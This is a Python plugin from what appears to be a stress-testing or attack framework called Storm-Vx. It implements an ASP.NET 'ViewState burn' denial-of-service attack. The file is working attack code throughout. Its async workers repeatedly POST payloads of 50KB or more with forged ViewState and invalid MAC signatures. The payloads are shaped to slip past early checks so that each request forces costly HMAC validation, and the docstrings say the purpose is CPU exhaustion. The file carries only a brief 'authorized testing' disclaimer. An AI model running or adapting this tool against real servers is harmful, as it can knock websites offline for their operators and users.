#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_viewstate_burn — ASP.NET ViewState Burn Attack Plugin

Sends requests with large ViewState payloads carrying invalid MAC
signatures. Each request forces ASP.NET to run full HMAC-SHA256
validation + decryption before rejecting. ViewState payloads are
50KB+ of base64-encoded data. Each validation costs ~50ms CPU on
the server.
Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import base64
import time
import random
from typing import Dict, Any
from urllib.parse import urlencode


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C, rand_str
import aiohttp


__all__ = ["ViewstateBurnPlugin"]


class ViewstateBurnPlugin(AttackPlugin):
    """ASP.NET ViewState burn — oversized ViewState with invalid MAC.

    Sends POST requests with 50KB+ ViewState payloads that have
    invalid MAC signatures. ASP.NET must run the full HMAC-SHA256
    validation and decryption pipeline before rejecting each request,
    burning significant CPU per attempt.
    """

    meta = PluginMeta(
        name='viewstate_burn',
        version='1.0.0',
        plugin_type='attack',
        description='ASP.NET ViewState burn — oversized ViewState with invalid MAC for CPU exhaustion (50x)',
        tags=['http', 'aspnet', 'viewstate', 'cpu-burn', 'mac-validation'],
        priority=24,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    def _build_viewstate_payload(self, size_kb: int = 50) -> str:
        """Build a large fake ViewState payload.

        Generates random base64 data that looks like a real ASP.NET
        ViewState token. The payload starts with /wEP (typical ViewState
        header) to avoid trivial server-side rejection before MAC check.

        Args:
            size_kb: Target payload size in kilobytes (default 50KB).

        Returns:
            Base64-encoded string resembling a ViewState value.
        """
        # Random bytes → base64 → looks like ViewState
        raw = rand_str(size_kb * 1024).encode('utf-8')
        vs = base64.b64encode(raw).decode('ascii')
        # ViewState typically starts with /wEP
        vs = '/wEPDwUKMT' + vs[10:]
        return vs

    def _build_form_body(self, viewstate: str, generator: str,
                         validation: str) -> str:
        """Build URL-encoded form body with ViewState fields.

        Constructs an application/x-www-form-urlencoded body containing
        the standard ASP.NET hidden fields plus a submit button, which
        forces the server to process the ViewState payload.

        Args:
            viewstate: The __VIEWSTATE value (large base64 payload).
            generator: The __VIEWSTATEGENERATOR value (hex string).
            validation: The __EVENTVALIDATION value (base64 string).

        Returns:
            URL-encoded form body string.
        """
        return urlencode({
            '__VIEWSTATE': viewstate,
            '__VIEWSTATEGENERATOR': generator,
            '__EVENTVALIDATION': validation,
            '__EVENTTARGET': '',
            '__EVENTARGUMENT': '',
            'ctl00$MainContent$btnSubmit': 'Submit',
        })

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """ViewState burn worker: POST with oversized invalid-MAC ViewState.

        Each iteration builds a fresh 50KB+ ViewState payload and sends it
        as a POST request. The server must parse and validate the MAC
        before rejecting, costing ~50ms of CPU per request.
        """
        _ssl = context.ssl_param

        pages = context.page_targets or [context.url]
        delay_ms = context.extra.delay_ms
        size_kb = getattr(context.extra, 'viewstate_size_kb', 50)

        # Pre-build a ViewState payload (refresh periodically for variety)
        vs_payload = self._build_viewstate_payload(size_kb)
        refresh_counter = 0

        while not self._stop_event.is_set():
            try:
                url = random.choice(pages)

                # Refresh the ViewState payload every ~100 requests for variety
                refresh_counter += 1
                if refresh_counter % 100 == 0:
                    vs_payload = self._build_viewstate_payload(size_kb)

                # Build random generator and validation tokens
                generator = rand_str(8, )  # 8-char hex-like generator
                # Make generator look like a real VIEWSTATEGENERATOR (hex)
                generator = ''.join(random.choices('0123456789ABCDEF', k=8))
                # Random EVENTVALIDATION base64 token
                validation_raw = rand_str(256).encode('utf-8')
                validation = base64.b64encode(validation_raw).decode('ascii')

                # Build form body
                body = self._build_form_body(vs_payload, generator, validation)

                headers = self._get_fresh_headers(context, "document")
                headers["Content-Type"] = "application/x-www-form-urlencoded"

                t = time.time()
                try:
                    async with context.session.post(url, headers=headers,
                                                    data=body, ssl=_ssl,
                                                    allow_redirects=False) as resp:
                        rt = time.time() - t
                        ok = resp.status < 500
                        await self._record("VS-BURN", ok, resp.status, rt,
                                           url=url[:60])
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.time() - t
                    await self._record("VS-BURN", False, 0, rt,
                                       err=type(exc).__name__, url=url[:60])

                if delay_ms > 0:
                    await asyncio.sleep(delay_ms / 1000.0)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                await self._record("VS-BURN", False, 0, 0,
                                   err=type(exc).__name__)
                await asyncio.sleep(0.1)

